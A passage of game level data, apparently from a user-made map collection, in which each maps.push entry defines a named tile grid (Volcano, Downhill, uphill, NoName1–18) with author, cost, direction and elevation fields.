70,70,70,70,70,70,70,70,70,70,70,96,96,96,70,31,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,31,70,70,32,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,32,70,70,33,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,33,70,70,34,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,34,70,70,35,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,35,70,70,36,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,36,70,70,95,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,95,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,70,36,36,36,36,36,36,36,36,36,2,2,36,36,36,36,36,36,36,36,36]});
maps.push({name="Volcano",author="MoistNoodlez",id="#1658202654",direction="forward",cost=481,elevation=0,map=[10,10,12,14,16,16,16,14,14,14,14,14,14,12,10,10,9,9,2,2,12,12,14,16,18,18,18,16,16,16,16,16,16,14,12,10,10,9,9,9,14,14,16,18,20,20,20,18,18,18,18,18,18,16,14,12,10,10,10,9,16,16,18,20,22,22,22,20,20,20,20,20,20,18,16,14,12,12,10,10,16,18,20,22,22,22,22,22,22,22,22,22,22,20,18,16,14,14,12,10,16,18,20,22,24,24,24,24,24,24,24,22,22,20,20,18,16,16,14,12,18,20,22,22,24,75,76,76,76,24,24,24,22,22,22,20,18,16,14,12,18,20,22,22,24,76,76,76,76,75,24,24,24,22,22,20,18,16,14,12,18,20,22,24,24,76,76,76,76,76,76,75,24,22,22,20,18,16,14,12,18,20,22,24,24,76,76,93,94,76,76,75,24,22,22,20,18,16,14,12,18,20,22,24,75,76,76,76,76,76,76,24,24,22,22,20,18,16,14,12,18,20,22,22,24,76,76,76,76,76,76,24,24,22,22,20,18,16,14,12,18,20,22,22,24,24,75,75,75,24,24,24,22,22,22,20,18,16,14,12,16,18,20,22,22,24,24,24,24,24,24,24,22,20,20,18,16,16,14,12,16,18,20,20,22,22,22,22,22,22,22,22,22,20,18,16,14,14,12,10,14,16,18,20,20,20,20,20,20,20,20,20,20,20,18,16,14,12,10,10,14,16,16,18,18,18,18,18,18,18,18,18,18,18,16,14,12,10,9,10,12,14,16,16,16,16,16,16,16,16,16,16,16,16,14,12,10,9,9,9,12,12,14,14,14,14,14,14,14,14,14,14,14,14,12,10,9,9,96,96,97,12,12,12,12,12,12,12,12,12,12,12,12,12,10,10,9,96,2,2]});
maps.push({name="Downhill",author="MoistNoodlez",id="#1658204295",direction="forward",cost=240,elevation=-10,map=[0,0,0,1,24,24,2,2,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,1,23,66,66,66,66,23,1,0,0,0,0,0,0,0,0,0,0,0,0,1,22,68,68,68,68,22,1,0,0,0,0,0,0,0,0,0,0,0,0,1,21,68,68,68,68,21,1,0,0,0,0,0,0,0,0,0,0,0,0,1,20,68,68,68,68,20,1,0,0,0,0,0,0,0,0,0,0,0,0,1,19,66,66,66,66,19,1,0,0,0,0,0,0,0,0,0,0,0,0,1,18,68,68,68,68,18,1,0,0,0,0,0,0,0,0,0,0,0,0,1,17,68,68,68,68,17,1,0,0,0,0,0,0,0,0,0,0,0,0,1,16,68,68,68,68,16,1,0,0,0,0,0,0,0,0,0,0,0,0,1,15,66,66,66,66,15,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,68,68,68,68,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,13,68,68,68,68,13,1,0,0,0,0,0,0,0,0,0,0,0,0,1,12,68,68,68,68,12,1,0,0,0,0,0,0,0,0,0,0,0,0,1,11,66,66,66,66,11,1,0,0,0,0,0,0,0,0,0,0,0,0,1,10,68,68,68,68,10,1,0,0,0,0,0,0,0,0,0,0,0,0,1,9,68,68,68,68,9,1,0,0,0,0,0,0,0,0,0,0,0,0,1,8,68,68,68,68,8,1,0,0,0,0,0,0,0,0,0,0,0,0,1,7,66,66,66,66,7,1,0,0,0,0,0,0,0,0,0,0,0,0,1,6,95,95,95,95,6,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,95,2,2,95,5,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="uphill",author="MoistNoodlez",id="#1658204770",direction="forward",cost=240,elevation=9,map=[0,0,0,1,5,5,2,2,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,6,66,66,66,66,6,1,0,0,0,0,0,0,0,0,0,0,0,0,1,7,68,68,68,68,7,1,0,0,0,0,0,0,0,0,0,0,0,0,1,8,68,68,68,68,8,1,0,0,0,0,0,0,0,0,0,0,0,0,1,9,68,68,68,68,9,1,0,0,0,0,0,0,0,0,0,0,0,0,1,10,66,66,66,66,10,1,0,0,0,0,0,0,0,0,0,0,0,0,1,11,68,68,68,68,11,1,0,0,0,0,0,0,0,0,0,0,0,0,1,12,68,68,68,68,12,1,0,0,0,0,0,0,0,0,0,0,0,0,1,13,68,68,68,68,13,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,66,66,66,66,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,15,68,68,68,68,15,1,0,0,0,0,0,0,0,0,0,0,0,0,1,16,68,68,68,68,16,1,0,0,0,0,0,0,0,0,0,0,0,0,1,17,68,68,68,68,17,1,0,0,0,0,0,0,0,0,0,0,0,0,1,18,66,66,66,66,18,1,0,0,0,0,0,0,0,0,0,0,0,0,1,19,68,68,68,68,19,1,0,0,0,0,0,0,0,0,0,0,0,0,1,20,68,68,68,68,20,1,0,0,0,0,0,0,0,0,0,0,0,0,1,21,66,68,68,66,21,1,0,0,0,0,0,0,0,0,0,0,0,0,1,22,3,66,66,3,22,1,0,0,0,0,0,0,0,0,0,0,0,0,1,23,95,95,95,95,23,1,0,0,0,0,0,0,0,0,0,0,0,0,1,24,95,2,2,95,24,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="NoName1",author="fantasy",id="#1658245417",direction="forward",cost=204,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,24,3,5,5,5,0,0,0,5,5,0,0,0,5,5,5,3,24,0,0,24,5,5,65,5,0,0,0,128,129,0,0,0,5,65,5,5,24,0,0,24,3,5,5,5,0,0,0,5,5,0,0,0,5,5,5,3,24,0,0,24,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,24,0,0,24,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,24,0,0,24,0,0,0,0,0,0,5,66,66,5,0,0,0,0,0,0,24,0,0,24,0,0,0,0,0,5,5,66,66,5,5,0,0,0,0,0,24,0,0,24,0,0,0,0,0,5,16,67,67,16,5,0,0,0,0,0,24,0,0,24,0,0,0,0,5,5,17,66,66,17,5,5,0,0,0,0,24,0,0,24,0,0,0,0,5,18,18,66,66,18,18,5,0,0,0,0,24,0,0,24,0,0,0,0,5,19,19,66,66,19,19,5,0,0,0,0,24,0,0,24,0,0,0,0,5,20,20,66,66,20,20,5,0,0,0,0,24,0,0,24,0,0,0,0,5,21,21,66,66,21,21,5,0,0,0,0,24,0,0,24,0,0,0,0,5,22,22,66,66,22,22,5,0,0,0,0,24,0,0,24,0,0,0,0,5,5,23,66,66,23,5,5,0,0,0,0,24,0,0,24,24,24,24,24,0,5,5,24,24,5,5,0,24,24,24,24,24,0,0,24,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,24,0,0,24,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,24,0,0,100,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,100,0]});
maps.push({name="NoName3",author="fantasy",id="#1658245962",direction="forward",cost=135,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,100,25,25,0,0,25,25,0,0,25,25,0,0,25,25,0,0,25,25,25,25,25,25,0,0,25,25,0,0,25,25,0,0,25,25,0,0,25,25,0,0,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,27,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,29,29,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,42,42,43,43,44,44,44,130,130,130,130,130,130,130,130,130,66,25,25,25,42,42,43,43,44,44,44,130,130,130,130,130,130,130,130,130,66,25,2,2]});
maps.push({name="NoName5",author="fantasy",id="#1658246393",direction="forward",cost=307,elevation=-5,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,20,20,24,24,24,24,0,0,17,17,17,17,17,0,0,0,0,0,0,0,20,21,76,76,76,24,0,0,17,17,17,17,17,17,0,0,0,0,77,76,20,21,76,22,76,24,0,17,17,24,3,17,17,17,17,0,0,0,0,76,76,76,76,23,23,24,0,17,17,93,24,17,17,17,17,17,17,18,18,19,20,21,22,23,24,100,0,17,17,24,17,17,17,17,17,0,0,17,18,19,20,21,22,23,24,24,0,0,17,17,17,17,17,1,1,0,0,0,18,19,20,21,22,23,23,24,0,0,17,17,17,17,0,1,17,17,17,17,18,19,20,21,22,22,23,23,0,0,17,17,0,0,0,1,17,17,17,17,18,19,20,21,21,22,22,22,0,0,0,0,0,1,1,1,17,17,17,17,18,19,20,20,21,21,21,0,1,1,1,1,1,1,1,1,66,66,66,17,18,19,19,20,20,20,20,0,0,0,0,16,16,16,1,1,17,17,66,17,17,18,19,19,19,0,0,0,0,0,15,15,15,16,16,16,1,17,66,66,17,18,18,18,19,0,0,0,0,0,14,14,15,15,15,16,16,17,17,66,17,17,17,17,18,0,0,0,0,0,13,14,14,14,15,15,16,17,17,66,66,66,17,17,17,0,0,0,0,0,13,13,13,14,14,15,16,16,17,17,17,66,66,66,66,67,0,0,0,0,12,12,13,13,0,0,0,0,0,17,17,17,66,17,17,0,0,0,0,0,100,12,12,12,0,0,0,0,0,0,17,17,66,17,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,67,0,0,0,0,0]});
maps.push({name="NoName6",author="fantasy",id="#1658246853",direction="right",cost=237,elevation=0,map=[1,132,53,53,53,90,1,0,0,0,0,0,0,0,1,2,2,1,0,0,1,53,93,53,53,53,1,0,0,0,0,0,1,1,1,5,5,1,0,0,1,53,53,90,53,136,1,0,0,0,0,0,1,131,5,5,5,1,0,0,1,53,53,53,53,90,1,0,0,0,0,0,1,137,5,5,5,1,0,0,1,53,90,53,53,53,1,0,0,0,0,0,1,1,1,96,96,1,0,0,1,53,53,53,53,97,1,0,0,0,0,0,0,0,1,5,5,1,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,5,5,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,98,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,98,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,133,139,1,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,1,1,1,0,0,138,12,12,12,90,12,99,1,0,0,0,0,0,0,0,0,0,0,0,0,12,90,66,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,12,12,66,66,66,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,12,12,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,12,12,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,134,12,12,90,12,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="NoName7",author="fantasy",id="#1658246999",direction="left",cost=38,elevation=-19,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,2,5,5,65,5,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,2,5,5,65,5,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="NoName8",author="fantasy",id="#1658247093",direction="right",cost=54,elevation=-19,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,65,11,11,11,11,11,0,0,65,5,0,0,0,0,0,0,17,17,0,0,65,11,11,11,11,11,0,0,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="NoName10",author="fantasy",id="#1658247566",direction="forward",cost=402,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,100,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,1,1,117,117,117,89,117,117,117,117,117,117,117,117,117,117,117,117,94,117,1,1,117,117,117,117,94,117,117,117,117,117,117,117,117,117,117,117,117,117,1,1,117,117,117,117,117,117,1,117,117,117,117,117,117,117,117,89,117,117,1,1,117,117,117,117,117,117,117,117,117,89,117,117,93,117,117,117,117,117,1,1,89,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,1,1,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,1,117,1,1,117,117,117,117,117,117,89,117,117,117,117,117,117,117,117,117,117,117,1,1,117,117,93,117,117,117,117,117,117,117,117,117,89,117,117,117,117,117,1,1,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,1,1,117,117,117,117,117,117,117,117,1,117,117,117,117,117,117,117,117,89,1,1,117,1,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,1,1,117,117,117,117,117,117,117,117,117,89,117,117,117,117,117,117,117,117,1,1,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,1,117,1,1,89,117,117,89,117,117,117,117,117,117,117,117,117,117,117,117,117,117,1,1,117,117,117,117,117,117,117,117,117,117,94,117,117,117,117,117,117,117,1,1,117,117,117,117,117,117,89,117,117,117,117,117,117,117,117,117,117,117,1,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,89,117,100,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="NoName11",author="fantasy",id="#1658247772",direction="forward",cost=228,elevation=15,map=[0,0,0,0,2,2,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,5,5,5,0,0,0,0,67,67,67,67,67,67,67,67,24,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,67,24,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,67,24,0,0,0,0,6,6,6,0,0,0,0,0,0,0,0,0,0,0,67,24,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,0,0,67,24,0,0,0,0,8,8,8,0,0,8,8,8,0,0,0,0,0,0,67,24,0,0,0,0,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,0,0,19,19,19,19,19,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0]});
maps.push({name="NoName12",author="fantasy",id="#1658247982",direction="forward",cost=110,elevation=0,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,90,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,89,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,90,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,91,91,14,14,14,0,0,0,0,0,14,14,14,14,14,90,14,14,89,14,91,91,14,14,90,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,91,91,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,14,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="NoName13",author="fantasy",id="#1658248175",direction="forward",cost=280,elevation=0,map=[0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,24,24,1,1,1,1,1,1,1,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,17,18,19,20,21,22,23,24,24,24,64,64,64,64,64,64,64,64,64,64,18,19,20,21,22,23,24,23,24,24,64,64,90,64,64,64,64,64,64,64,19,20,21,22,23,24,23,22,24,24,64,64,64,64,64,90,64,64,90,64,20,21,22,23,24,23,22,21,24,24,64,64,64,64,64,64,64,64,64,64,21,22,23,24,23,22,21,20,24,24,64,94,64,64,90,64,64,64,93,64,22,23,24,23,22,21,20,19,24,24,64,64,64,64,64,64,64,64,64,64,23,24,23,22,21,20,19,18,24,24,64,64,90,64,64,64,64,64,64,64,24,24,23,22,21,20,19,18,24,24,64,64,64,64,64,64,64,64,64,64,100,24,23,22,21,20,19,18,2,2,64,64,64,90,64,64,64,64,64,100]});
maps.push({name="NoName14",author="fantasy",id="#1658248543",direction="right",cost=116,elevation=0,map=[0,2,2,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,5,5,5,5,96,5,5,5,5,5,98,5,5,5,101,5,5,5,5,2,5,5,5,5,96,5,5,5,5,5,98,5,5,5,101,5,5,5,5,2,5,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,102,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,97,5,5,5,5,5,99,5,5,5,5,5,99,5,5,5,5]});
maps.push({name="NoName16",author="fantasy",id="#1658248763",direction="forward",cost=143,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,5,0,0,0,0,0,0,0,0]});
maps.push({name="NoName17",author="fantasy",id="#1658248883",direction="forward",cost=173,elevation=-16,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,11,11,11,11,11,0,0,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0]});
maps.push({name="NoName18",author="fantasy",id="#1658248957",direction="right",cost=147,elevation=0,map=[0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,7,7,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,7,7,7,90,7,0,0,0,0,1,7,7,7,7,7,90,7,7,7,7,90,7,7,7,2,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,7,7,7,7,2,0,0,0,0,1,90,7,7,7,7,7,7,90,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
